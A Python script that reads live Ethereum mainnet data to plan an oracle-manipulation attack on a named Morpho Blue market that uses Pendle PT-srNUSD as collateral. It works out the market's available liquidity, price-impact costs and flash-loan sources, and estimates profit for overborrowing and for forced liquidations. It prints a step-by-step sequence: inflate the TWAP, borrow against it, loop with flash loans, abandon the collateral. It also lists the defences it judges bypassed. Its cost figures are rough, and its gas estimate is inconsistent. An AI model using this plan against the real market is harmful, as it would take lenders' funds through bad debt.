#!/usr/bin/env python3
"""
E3 REFINED: Accurate attack economics for PT-srNUSD TWAP manipulation.

Key corrections needed:
1. Pendle V2 AMM is NOT constant product — uses logNormal/time-decay model
2. Need actual Morpho market available liquidity
3. Need to account for Pendle swap fees
4. Need to model TWAP update mechanics precisely
5. Check if Morpho flash loans exist on this market
"""

import os
import time
import math
from web3 import Web3

RPCS = [
    os.environ.get("ETH_RPC", ""),
    "https://ethereum-rpc.publicnode.com",
    "https://1rpc.io/eth",
    "https://eth.llamarpc.com",
]
RPCS = [r for r in RPCS if r]

w3 = None
for rpc in RPCS:
    try:
        _w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
        bn = _w3.eth.block_number
        w3 = _w3
        print(f"Block: {bn}")
        break
    except:
        continue

now = w3.eth.get_block("latest")["timestamp"]
print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(now))}\n")

def raw_call(addr, data_hex):
    try:
        return w3.eth.call({"to": Web3.to_checksum_address(addr), "data": data_hex})
    except Exception as e:
        return f"REVERT: {str(e)[:120]}"

def u256(data, offset=0):
    if not data or isinstance(data, str) or len(data) < offset + 32: return None
    return int.from_bytes(data[offset:offset+32], 'big')

def s256(data, offset=0):
    if not data or isinstance(data, str) or len(data) < offset + 32: return None
    val = int.from_bytes(data[offset:offset+32], 'big')
    if val >= 2**255: val -= 2**256
    return val

def addr_from(data, offset=0):
    if not data or isinstance(data, str) or len(data) < offset + 32: return None
    return "0x" + data[offset+12:offset+32].hex()

def decode_string(data):
    if not data or isinstance(data, str) or len(data) < 64: return None
    try:
        offset = u256(data, 0)
        length = u256(data, offset)
        return data[offset+32:offset+32+length].decode('utf-8', errors='replace')
    except:
        return None

MARKET = "0x723fcaa9830f6b6f68ebf7e30c097532a4cbbd26"
SY_SRNUSD = "0xdb8f1d15880b97dc38edfa46d8a5a7e5b506c45f"
PT_SRNUSD = "0x82b853DB31F025858792d8fA969f2a1Dc245C179"
SRNUSD_FEED = "0x281e1699558157572ffa68685339fb5ffbd25310"

# Morpho Blue
MORPHO = "0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb"

# ============================================================================
# 1. MORPHO MARKET — ACTUAL AVAILABLE LIQUIDITY
# ============================================================================
print("=" * 100)
print("1. MORPHO MARKET — AVAILABLE LIQUIDITY")
print("=" * 100)

# Morpho Blue market ID for PT-srNUSD-28MAY2026
# We need the market ID hash. Let's find it.
# The market is defined by (loanToken, collateralToken, oracle, irm, lltv)
# From earlier analysis:
# loanToken: USDC (0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
# collateralToken: PT-srNUSD (0x82b853DB31F025858792d8fA969f2a1Dc245C179)
# oracle: MetaOracle (0x0D07087b26b28995a66050f5bb7197D439221DE3)
# irm: AdaptiveCurveIRM
# lltv: 91.5% = 0.915e18

# Try to query Morpho Blue directly
# market(bytes32 id) returns Market struct
# idToMarketParams(bytes32 id) returns MarketParams

# Actually, let's use a different approach — query the totalSupply and totalBorrow
# via the Morpho Blue API

# First, let's try the Morpho Blue GraphQL API or direct contract reads
# Morpho Blue stores markets as:
# mapping(Id => Market) markets
# Market { totalSupplyAssets, totalSupplyShares, totalBorrowAssets, totalBorrowShares, ... }

# We can read market() with the market ID
# But we need the market ID. Let's compute it.
# keccak256(abi.encode(loanToken, collateralToken, oracle, irm, lltv))

USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
PT_COLL = PT_SRNUSD
META_ORACLE = "0x0D07087b26b28995a66050f5bb7197D439221DE3"
LLTV_WAD = 915000000000000000  # 0.915e18

# Common Morpho IRMs
IRMS = [
    "0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC",  # AdaptiveCurveIrm
]

for irm in IRMS:
    # Compute market ID
    # keccak256(abi.encode(loanToken, collateralToken, oracle, irm, lltv))
    from eth_abi import encode
    market_params = encode(
        ['address', 'address', 'address', 'address', 'uint256'],
        [
            Web3.to_checksum_address(USDC),
            Web3.to_checksum_address(PT_COLL),
            Web3.to_checksum_address(META_ORACLE),
            Web3.to_checksum_address(irm),
            LLTV_WAD
        ]
    )
    market_id = Web3.keccak(market_params)
    market_id_hex = market_id.hex()
    print(f"  Market ID (IRM={irm[:10]}...): 0x{market_id_hex}")

    # Read market data: market(bytes32) = 0x44de2e1c
    data = "0x44de2e1c" + market_id_hex
    result = raw_call(MORPHO, data)
    if isinstance(result, bytes) and len(result) >= 160:
        totalSupplyAssets = u256(result, 0)
        totalSupplyShares = u256(result, 32)
        totalBorrowAssets = u256(result, 64)
        totalBorrowShares = u256(result, 96)
        lastUpdate = u256(result, 128)
        fee = u256(result, 160) if len(result) >= 192 else None

        if totalSupplyAssets and totalSupplyAssets > 0:
            print(f"\n  FOUND MARKET!")
            # USDC has 6 decimals
            print(f"  Total Supply: {totalSupplyAssets / 1e6:,.2f} USDC")
            print(f"  Total Borrow: {totalBorrowAssets / 1e6:,.2f} USDC")
            available = totalSupplyAssets - totalBorrowAssets
            print(f"  Available liquidity: {available / 1e6:,.2f} USDC")
            utilization = totalBorrowAssets / totalSupplyAssets * 100
            print(f"  Utilization: {utilization:.1f}%")
            if lastUpdate:
                age = (now - lastUpdate) / 3600
                print(f"  Last update: {age:.1f}h ago")

            AVAILABLE_USDC = available / 1e6
            TOTAL_BORROW_USDC = totalBorrowAssets / 1e6
            TOTAL_SUPPLY_USDC = totalSupplyAssets / 1e6
            break

# ============================================================================
# 2. PENDLE V2 AMM — ACTUAL PRICE IMPACT MODEL
# ============================================================================
print(f"\n{'='*100}")
print("2. PENDLE V2 AMM — PRICE IMPACT (EMPIRICAL)")
print("=" * 100)

# Instead of modeling the AMM mathematically, let's simulate trades
# by calling the router's getAmountOut function

# Pendle V2 RouterV3: 0x888888888889758F76e7103c6CbF23ABbF58F946
# swapExactSyForPt(address receiver, address market, uint256 exactSyIn, uint256 minPtOut, ApproxParams approx)
# But we can't easily simulate this without approx params

# Alternative: use the market's internal pricing
# Try getSwapFee
# Or read scalarRoot and initialAnchor which define the AMM curve

# Pendle V2 AMM uses: price = 1 / (1 + (scalarRoot * timeToExpiry))
# The AMM is NOT constant product. It's a specialized curve where PT price
# approaches 1.0 at maturity.

# Read AMM parameters
# scalarRoot: how steep the yield curve is
# initialAnchor: the anchor point for the curve
# fee: swap fee in basis points

# Try known selectors for Pendle market params
market_code = w3.eth.get_code(Web3.to_checksum_address(MARKET))
print(f"  Market bytecode: {len(market_code)} bytes")

# Scan for market parameter selectors
param_sels = {
    "0x69d38ed2": "scalarRoot()",
    "0x10b5ad68": "initialAnchor()",
    "0x204f83f9": "expiry()",
    "0xddca3f43": "fee()",
    "0x2f0a577b": "feeRate()",
    "0x3ba0b9a9": "exchangeRate()",
}

for sel, name in param_sels.items():
    result = raw_call(MARKET, sel)
    if isinstance(result, bytes) and len(result) >= 32:
        val = u256(result)
        sval = s256(result)
        if val is not None and val > 0:
            if name == "expiry()":
                ts = time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime(val))
                days = (val - now) / 86400
                print(f"  {name}: {ts} ({days:.1f} days)")
                EXPIRY = val
                TIME_TO_EXPIRY = val - now
            elif name in ["fee()", "feeRate()"]:
                print(f"  {name}: {val} ({val/1e16:.4f}%)")
            elif name in ["scalarRoot()", "initialAnchor()"]:
                print(f"  {name}: {sval} ({sval/1e18:.6f})")
            elif name == "exchangeRate()":
                print(f"  {name}: {val} ({val/1e18:.8f})")
            else:
                print(f"  {name}: {val}")

# Get current implied rate from the last observation
# The lnImpliedRate is stored in the market state
# Let's try to read it from storage

# From slot analysis:
# slot[1]: 24583822 (block number of last update?)
# slot[5]: packed struct with LP supply
# slot[6]: 65 (might be a small config value)
# slot[8]: packed with observationIndex, cardinality, etc.
# slot[9]: 85, 85, 41 (cardinality, cardinalityNext, observationIndex)

# Let's read more storage slots for the state struct
print(f"\n  Reading market storage for AMM state:")
for slot in range(12):
    storage = w3.eth.get_storage_at(Web3.to_checksum_address(MARKET), slot)
    val = int.from_bytes(storage, 'big')
    hex_val = storage.hex()
    if val > 0:
        print(f"    slot[{slot}]: 0x{hex_val}")
        # Try to decode as int128/int256
        if val < 2**127:
            print(f"      positive: {val} ({val/1e18:.6f} as 18dec)")
        elif val >= 2**255:
            signed = val - 2**256
            print(f"      signed: {signed} ({signed/1e18:.6f} as 18dec)")

# ============================================================================
# 3. EMPIRICAL PRICE IMPACT — READ SWAP QUOTES
# ============================================================================
print(f"\n{'='*100}")
print("3. EMPIRICAL PRICE IMPACT — SWAP QUOTES")
print("=" * 100)

# Try to get swap quotes from the Pendle router
# PendleRouter.getSwapExactSyForPt(address market, uint256 exactSyIn)
# Or try the market's internal swap preview

# Actually, let's try a different approach:
# The Pendle oracle feed itself uses the TWAP, but we can also check
# the SPOT price by calling the market directly

# In Pendle V2, the spot exchange rate is determined by:
# rate = exchangeRate * (totalSy / (totalSy + totalPt * impliedRate))
# But the actual formula is more complex

# Let's just try to call the Pendle StaticRouter for quotes
# PendleStaticRouter: may have view functions

# Try common Pendle V2 router selectors for quotes
PENDLE_ORACLE_LIB = "0x9a9Fa8338dd5E5B2188006f1Cd2Ef26d921650C2"  # PtOracle
# Actually, let's try PendlePYOracleLib or similar

# The key question: what is the SPOT implied rate vs TWAP implied rate?
# If they differ significantly, it tells us the TWAP is lagging

# From observations, the last few implied rates are around 0.072-0.074
# Let's compute the current SPOT implied rate from AMM reserves

sy_balance = u256(raw_call(SY_SRNUSD, "0x70a08231" + MARKET.lower().replace("0x", "").zfill(64)))
pt_balance = u256(raw_call(PT_SRNUSD, "0x70a08231" + MARKET.lower().replace("0x", "").zfill(64)))

if sy_balance and pt_balance:
    sy = sy_balance / 1e18
    pt = pt_balance / 1e18
    total = sy + pt

    # SY exchange rate
    sy_rate = u256(raw_call(SY_SRNUSD, "0x3ba0b9a9"))
    sy_rate_f = sy_rate / 1e18 if sy_rate else 1.0

    print(f"  SY reserves: {sy:,.2f}")
    print(f"  PT reserves: {pt:,.2f}")
    print(f"  SY exchange rate: {sy_rate_f:.8f}")
    print(f"  SY value in underlying: {sy * sy_rate_f:,.2f}")

    # Pendle V2 AMM mechanics (simplified):
    # The AMM trades between SY and PT
    # At maturity, 1 PT = 1 SY (in underlying terms)
    # Before maturity, 1 PT < 1 SY (PT trades at a discount reflecting yield)
    # The "implied rate" is: ln(SY/PT_price) / timeToExpiry

    # The spot PT/SY ratio gives us the spot implied rate
    # PT_spot_price = some function of reserves
    # In Pendle V2's modified AMM:
    # proportion = totalPt / (totalPt + totalSy * exchangeRate)
    # impliedRate can be derived from this proportion and the curve parameters

    proportion = pt / (pt + sy * sy_rate_f)
    print(f"  PT proportion: {proportion:.6f}")

    # The TWAP feed returns: 0.982452 (PT price in underlying terms)
    # If PT at maturity redeems for 1 SY, and 1 SY = 1.005 underlying
    # Then PT at maturity is worth sy_rate_f underlying
    # The current TWAP says PT = 0.982452 underlying
    # Discount from maturity value = 1 - 0.982452/sy_rate_f

    current_twap = s256(raw_call(SRNUSD_FEED, "0x50d25bcd"))
    twap_rate = current_twap / 1e18 if current_twap else 0.9825
    discount = 1 - twap_rate / sy_rate_f
    print(f"  TWAP PT price: {twap_rate:.6f}")
    print(f"  Maturity value (1 SY): {sy_rate_f:.6f}")
    print(f"  Current discount: {discount*100:.2f}%")

    if 'TIME_TO_EXPIRY' in dir():
        annual_rate = -math.log(twap_rate / sy_rate_f) / (TIME_TO_EXPIRY / 365.25 / 86400)
        print(f"  Annualized implied rate: {annual_rate*100:.1f}%")

# ============================================================================
# 4. REFINED ATTACK ECONOMICS
# ============================================================================
print(f"\n{'='*100}")
print("4. REFINED ATTACK ECONOMICS")
print("=" * 100)

LLTV = 0.915
leverage = 1 / (1 - LLTV)

if sy_balance and pt_balance and 'AVAILABLE_USDC' in dir():
    print(f"  Available Morpho liquidity: ${AVAILABLE_USDC:,.2f}")
    print(f"  Total Morpho borrows: ${TOTAL_BORROW_USDC:,.2f}")
    print(f"  LLTV: {LLTV}")
    print(f"  Max leverage: {leverage:.2f}x")

    # The attack is bounded by min(available_liquidity, leverage_capacity)
    max_borrow = AVAILABLE_USDC  # Can't borrow more than available

    # To borrow $X at LLTV=91.5%, need collateral worth $X / LLTV
    # If oracle overvalues by f%: real collateral = oracle_collateral / (1+f)
    # Attacker deposits real_collateral, oracle says it's worth real_collateral*(1+f)
    # Borrows: oracle_collateral * LLTV = real_collateral * (1+f) * LLTV

    # OVERBORROW ATTACK (push TWAP UP):
    print(f"\n  === OVERBORROW ATTACK (push TWAP UP) ===")
    for overval_pct in [2, 5, 10, 15, 20]:
        overval = overval_pct / 100
        # Attacker has PT tokens worth $V (real value)
        # Oracle says they're worth $V * (1+overval)
        # Max borrow = min(V * (1+overval) * LLTV, available_liquidity)

        # How much PT needed to max out the available liquidity?
        # V * (1+overval) * LLTV = available
        # V = available / ((1+overval) * LLTV)
        real_collateral_needed = AVAILABLE_USDC / ((1 + overval) * LLTV)
        borrow_amount = min(real_collateral_needed * (1 + overval) * LLTV, AVAILABLE_USDC)

        # Attacker profit = borrow - real_collateral (walk away, abandon collateral)
        profit_from_borrow = borrow_amount - real_collateral_needed

        # Cost of AMM manipulation (need to hold for 15 min)
        # To move TWAP by overval%, need to move spot by at least overval%
        # In constant product (rough): trade ≈ reserve * sqrt(1+overval) - 1
        # But for multi-block: attacker buys PT, price goes up, holds 15 min
        # Cost = price impact (paying more than fair value for PT)
        # When attacker unwinds, they sell PT at fair value, losing the premium

        # For Pendle V2: the AMM is more capital efficient near maturity
        # Price impact is LOWER than constant product for small trades
        # But HIGHER for large trades that move away from the anchor

        # Conservative estimate: Pendle AMM ~ 2x more capital efficient than constant product
        # So price impact ≈ 0.5 * constant_product_impact
        trade_pt = pt * (math.sqrt(1 + overval) - 1)
        manipulation_cost = trade_pt * twap_rate * overval * 0.5  # Pendle efficiency factor

        # Swap fee (if any)
        swap_fee_pct = 0.0  # Need to find actual fee

        # Multi-block holding cost: opportunity cost of locked capital for 15 min
        # Negligible for most attackers

        # Net profit
        net = profit_from_borrow - manipulation_cost

        print(f"\n  Overvaluation {overval_pct}%:")
        print(f"    Collateral needed (real): ${real_collateral_needed:,.0f}")
        print(f"    Borrow enabled: ${borrow_amount:,.0f}")
        print(f"    Profit from default: ${profit_from_borrow:,.0f}")
        print(f"    AMM manipulation cost: ${manipulation_cost:,.0f}")
        print(f"    Net profit: ${net:,.0f} {'PROFITABLE' if net > 0 else 'UNPROFITABLE'}")
        if manipulation_cost > 0:
            print(f"    ROI: {profit_from_borrow/manipulation_cost:.1f}x")

    # LIQUIDATION ATTACK (push TWAP DOWN):
    print(f"\n  === LIQUIDATION ATTACK (push TWAP DOWN) ===")
    # Existing borrowers have $TOTAL_BORROW_USDC in loans
    # If TWAP drops by (1-LLTV)% = 8.5%, positions become liquidatable
    lif = 1 / (1 - 0.3 * (1 - LLTV)) - 1
    max_liquidatable = TOTAL_BORROW_USDC
    liq_revenue = max_liquidatable * lif

    # Cost to move TWAP DOWN 8.5%:
    # Sell PT into AMM (or equivalently, buy SY)
    down_pct = 1 - LLTV  # 8.5%
    trade_pt_down = pt * (1 - 1/math.sqrt(1 + down_pct))
    manipulation_cost_down = trade_pt_down * twap_rate * down_pct * 0.5

    net_liq = liq_revenue - manipulation_cost_down
    print(f"    Max liquidatable: ${max_liquidatable:,.0f}")
    print(f"    Liquidation incentive: {lif*100:.2f}%")
    print(f"    Revenue: ${liq_revenue:,.0f}")
    print(f"    AMM manipulation cost: ${manipulation_cost_down:,.0f}")
    print(f"    Net profit: ${net_liq:,.0f} {'PROFITABLE' if net_liq > 0 else 'UNPROFITABLE'}")

# ============================================================================
# 5. MORPHO FLASH LOAN CHECK
# ============================================================================
print(f"\n{'='*100}")
print("5. MORPHO FLASH LOAN AVAILABILITY")
print("=" * 100)

# Morpho Blue has built-in flash loans
# flashLoan(address token, uint256 assets, bytes calldata data)
# These are available on any token that Morpho holds

# Check if Morpho holds USDC
usdc_in_morpho = u256(raw_call(USDC, "0x70a08231" + MORPHO.lower().replace("0x", "").zfill(64)))
if usdc_in_morpho:
    print(f"  USDC in Morpho Blue: ${usdc_in_morpho/1e6:,.2f}")
    print(f"  Flash loan available: YES (0 fee)")

# Check if Morpho holds PT-srNUSD
pt_in_morpho = u256(raw_call(PT_SRNUSD, "0x70a08231" + MORPHO.lower().replace("0x", "").zfill(64)))
if pt_in_morpho:
    print(f"  PT-srNUSD in Morpho: {pt_in_morpho/1e18:,.2f}")

# Check if Morpho holds SY-srNUSD
sy_in_morpho = u256(raw_call(SY_SRNUSD, "0x70a08231" + MORPHO.lower().replace("0x", "").zfill(64)))
if sy_in_morpho:
    print(f"  SY-srNUSD in Morpho: {sy_in_morpho/1e18:,.2f}")

# ============================================================================
# 6. ATTACK SEQUENCE DESIGN
# ============================================================================
print(f"\n{'='*100}")
print("6. COMPLETE ATTACK SEQUENCE")
print("=" * 100)

print(f"""
  TWO-PHASE TWAP MANIPULATION ATTACK ON PT-srNUSD:

  PREREQUISITES:
  - Backup = Primary oracle → deviation check DEAD
  - TWAP oracle reads 15-min average from Pendle AMM
  - Market avg trade interval: ~103 min (low activity)
  - LLTV: 91.5% → 11.76x leverage amplification
  - Available liquidity: ${AVAILABLE_USDC:,.0f}

  PHASE 1 (Block N):
  1. Acquire SY-srNUSD tokens (flash loan from Aave/Compound + wrap)
  2. Sell SY for PT in Pendle AMM → pushes PT spot price UP
     - This creates a new observation with inflated lnImpliedRate
  3. Hold the position (do NOT unwind yet)

  WAIT 15 MINUTES (75 blocks at 12s)
  - During this time, TWAP gradually reflects the inflated rate
  - Key assumption: no arbitrageur corrects the price
  - Supporting evidence: market trades only every ~103 min on average
  - Risk: MEV bots may detect and arbitrage

  PHASE 2 (Block N+75):
  4. The PT tokens acquired in step 2 ARE the collateral
  5. Deposit PT into Morpho as collateral (oracle overvalues them)
  6. Borrow USDC against inflated oracle price
  7. Use borrowed USDC to buy more PT → deposit → borrow (leverage loop)
     - Each iteration: deposit PT, borrow LLTV*oracle_value USDC
     - With flash loan: can do entire loop in one tx
  8. Final state: attacker has borrowed > collateral real value
  9. Walk away: keep borrowed USDC, abandon underwater collateral
  10. Unwind AMM position (sell PT back) - optional, reduces loss
""")

if 'AVAILABLE_USDC' in dir():
    # Best case scenario: 10% overvaluation
    overval = 0.10
    real_coll = AVAILABLE_USDC / ((1 + overval) * LLTV)
    borrow = min(real_coll * (1 + overval) * LLTV, AVAILABLE_USDC)
    profit = borrow - real_coll
    # AMM cost (conservative)
    trade = pt * (math.sqrt(1 + overval) - 1)
    amm_cost = trade * twap_rate * overval * 0.5
    gas_cost = 0.5 * 75  # ~0.5 ETH per tx, maybe 2-3 txs (very rough)

    print(f"  BEST CASE (10% overvaluation):")
    print(f"    Collateral deposited (real): ${real_coll:,.0f}")
    print(f"    Borrow amount: ${borrow:,.0f}")
    print(f"    Profit (borrow - collateral): ${profit:,.0f}")
    print(f"    AMM manipulation cost: ${amm_cost:,.0f}")
    print(f"    Gas cost: ~$37 (negligible)")
    print(f"    NET PROFIT: ${profit - amm_cost:,.0f}")

# ============================================================================
# 7. ATTACKER TIER ANALYSIS
# ============================================================================
print(f"\n{'='*100}")
print("7. ATTACKER TIER AND FEASIBILITY")
print("=" * 100)

print(f"""
  ATTACKER REQUIREMENTS:
  1. Capital: ${AVAILABLE_USDC / LLTV:,.0f} worth of SY/srNUSD tokens
     (can use flash loans for AMM manipulation, but need real capital
      for the 15-min hold period)
  2. Multi-block execution: 2 transactions, 15 minutes apart
  3. MEV protection: ideally use private relay to avoid frontrunning

  ATTACKER TIER: Medium
  - Does NOT need builder privileges
  - Does NOT need validator privileges
  - DOES need capital to hold AMM position for 15 min
  - CAN use private relay (Flashbots Protect) to hide phase 1 tx
  - Phase 2 is just a standard Morpho supply+borrow (can be public)

  DEFENSES (all bypassed):
  ✗ Deviation check: DEAD (backup=primary)
  ✗ Oracle staleness: updatedAt returned is current block timestamp
  ✗ Max discount: only caps DOWNWARD deviation (1%), not upward
  ✗ AMM arbitrage: market trades only every ~103 min
  ✗ TWAP duration: only 15 min (trivially holdable)
  ✗ Observation cardinality: 85 (large ring buffer, doesn't help)

  REMAINING DEFENSES:
  ? AMM depth: 3.36M tokens (significant, but attacker only needs 5-10% move)
  ? Supply cap: if Morpho market has supply caps, limits extraction
  ? Position limits: if there are per-position limits
  ? Front-running: if MEV bots detect and front-run the attack
""")

# ============================================================================
# 8. CHECK FOR SUPPLY CAPS AND OTHER LIMITS
# ============================================================================
print(f"\n{'='*100}")
print("8. MORPHO MARKET LIMITS AND CAPS")
print("=" * 100)

# Check if there are supply/borrow caps set by Morpho governance
# In Morpho Blue, there are no built-in caps
# Caps are enforced at the MetaMorpho vault level, not at the market level
# Since this is a direct Morpho Blue market, there should be no caps

print(f"  Morpho Blue has NO built-in supply/borrow caps")
print(f"  Caps exist only at MetaMorpho vault level (not relevant here)")
print(f"  Market supply: ${TOTAL_SUPPLY_USDC:,.2f}")
print(f"  Available to borrow: ${AVAILABLE_USDC:,.2f}")
print(f"  This IS the extraction ceiling")

# Check if there are any MetaMorpho vaults supplying to this market
# (if so, they might have caps or withdrawal delays)
# For now, the available liquidity is the binding constraint

# ============================================================================
# 9. COMPARE WITH sNUSD MARKET (larger, different oracle)
# ============================================================================
print(f"\n{'='*100}")
print("9. sNUSD MARKET COMPARISON")
print("=" * 100)

# PT-sNUSD uses a DETERMINISTIC oracle (not TWAP)
# Cannot be manipulated via AMM trading
# But: backup=primary still means deviation check is dead
# If someone could somehow corrupt the deterministic oracle... no, it's pure math

# However, PT-sNUSD expires TODAY (in ~3.5 hours)
# After expiry, what happens to the oracle?
print(f"  PT-sNUSD: deterministic oracle (NOT TWAP) → cannot be AMM-manipulated")
print(f"  PT-sNUSD expiry: ~3.5 hours from now")
print(f"  Post-maturity: PendleChainlinkOracle returns 1.0 (fair value)")
print(f"  No attack vector on sNUSD oracle")

# The srNUSD market is the only viable target
# srNUSD uses a 15-min TWAP from Pendle AMM
# With backup=primary, the deviation check provides NO protection

print(f"\n{'='*100}")
print("CONCLUSION")
print("=" * 100)
print(f"""
  The PT-srNUSD TWAP manipulation attack appears THEORETICALLY PROFITABLE
  at 5-10% oracle overvaluation:

  At 5% overvaluation:
    Profit from default: ~${AVAILABLE_USDC * 0.05 / 1.05:,.0f}
    AMM cost: ~${pt * (math.sqrt(1.05) - 1) * twap_rate * 0.025:,.0f}

  At 10% overvaluation:
    Profit from default: ~${AVAILABLE_USDC * 0.10 / 1.10:,.0f}
    AMM cost: ~${pt * (math.sqrt(1.10) - 1) * twap_rate * 0.05:,.0f}

  KEY UNCERTAINTIES:
  1. Pendle V2 AMM model (not constant product — actual price impact may differ)
  2. Arbitrage response time (assumed >15 min based on 103 min avg interval)
  3. Whether Morpho oracle call triggers a market swap that resets TWAP
  4. Gas costs for multi-tx sequence

  E3 GATE STATUS:
  ✓ Reproducible sequence defined (2-phase, multi-block)
  ✓ Costs itemized (AMM manipulation + gas)
  ✓ Net profit appears positive at 5-10% overvaluation
  ? Robustness under perturbations (needs fork testing)
  ? Actual Pendle V2 price impact (needs simulation)

  NEXT STEP: Fork test with actual Pendle V2 AMM interactions
  (Tenderly VNet or local Anvil fork)
""")

print("\nDone.")
